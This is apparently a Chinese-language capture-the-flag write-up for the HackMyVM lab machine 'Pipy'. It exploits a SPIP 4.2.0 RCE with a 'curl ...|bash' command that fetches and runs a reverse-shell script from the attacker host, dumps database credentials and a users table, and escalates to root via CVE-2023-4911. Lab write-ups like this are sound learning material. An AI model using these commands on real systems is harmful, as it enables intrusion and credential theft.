# Pipy

2025.03.27 https://hackmyvm.eu/machines/machine.php?vm=Pipy

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

cms 版本 SPIP 4.2.0 有 RCE https://www.exploit-db.com/exploits/51536

```
python3 51536.py -u http://192.168.5.39/ -c 'curl http://192.168.5.3/shell/5.3/8888.sh|bash' -v
```

发现数据库连接信息：

```
www-data@pipy:/var/www/html$ cat ./config/connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

进入到数据库 root:dbpassword ，拿到用户表：

```
MariaDB [spip]> select id_auteur, nom, bio, pass from spip_auteurs;
+-----------+--------+-----+--------------------------------------------------------------+
| id_auteur | nom    | bio | pass                                                         |
+-----------+--------+-----+--------------------------------------------------------------+
|         1 | Angela |     | 4ng3l4                                                       |
|         2 | admin  |     | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |
+-----------+--------+-----+--------------------------------------------------------------+
```

切换到 angela 用户，拿到 user flag:

```
angela@pipy:~$ cat user.txt
dab37650d43787424362d5805140538d
```

glibc 存在内核漏洞 https://github.com/leesh3288/CVE-2023-4911 将 zip 下载到目标机器，解压 make 等待，最终拿到 root 权限。

root flag：

```
# cat root.txt
ab55ed08716cd894e8097a87dafed016
```
